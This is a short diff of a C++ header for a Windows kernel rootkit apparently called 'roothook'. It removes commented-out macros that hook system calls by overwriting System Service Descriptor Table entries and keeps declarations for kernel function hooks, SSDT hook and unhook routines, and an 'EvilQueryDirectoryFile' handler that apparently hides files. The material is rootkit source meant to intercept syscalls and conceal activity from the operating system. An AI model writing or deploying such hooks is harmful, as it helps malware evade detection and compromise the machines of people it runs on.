@@ -2,24 +2,6 @@
 #include "requests.h"
 
 
-/*
-typedef struct _SYSTEM_SERVICE_ENTRY {
-	ULONG* ServiceTableBase;
-	ULONG* CounterTableBase;
-	ULONG NumberOfServices;
-	unsigned char* ArgumentTableBase;
-} SYSTEM_SERVICE_ENTRY, * PSYSTEM_SERVICE_ENTRY;
-
-__declspec(dllimport) SYSTEM_SERVICE_ENTRY KeServiceDescriptorTable;  // Exported by ntoskrnl.exe
-#define SystemServiceInSSDT(ServiceFunction) KeServiceDescriptorTable.ServiceTableBase[*(PULONG)((PUCHAR)ServiceFunction+1)]
-#define GetSystemServiceIndex(ServiceFunction) *(PULONG)((PUCHAR)ServiceFunction+1)
-#define HookSystemCall(ServiceFunction, HookingFunction, OriginalFunction, MappedSSDT)  \
-       OriginalFunction = (PVOID)InterlockedExchange((PLONG)&MappedSSDT[GetSystemServiceIndex(ServiceFunction)], (LONG)HookingFunction)
-#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
-       InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
-*/
-
-
 // Memory functions pool structure is 'Hk..'
 namespace roothook {
 	NTSTATUS SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag);  // Hook to a function from the windows 10 kernel / from a driver
@@ -31,7 +13,7 @@ namespace roothook {
 		ULONG64 CurrentSSDTFuncAddr(ULONG SyscallNumber);  // Get the address of the current function signed as the system service at syscall number SyscallNumber
 		ULONG64 GetServiceDescriptorTable();  // Get the base address of the actual SSDT in memory
 		ULONG GetOffsetFromSSDTBase(ULONG64 FunctionAddress);  // Get the offset of a function/address from the base of the SSDT table (used to calculate entry value)
-		NTSTATUS SystemServiceDTHook(PVOID HookingFunction, ULONG Tag, PUNICODE_STRING SystemServiceName);  // Perform an SSDT hook
+		NTSTATUS SystemServiceDTHook(PVOID HookingFunction, ULONG Tag);  // Perform an SSDT hook
 		NTSTATUS SystemServiceDTUnhook(PVOID HookingFunction, ULONG SyscallNumber);  // Unhook the SSDT entry
 	}
 	NTSTATUS EvilQueryDirectoryFile(IN HANDLE FileHandle,
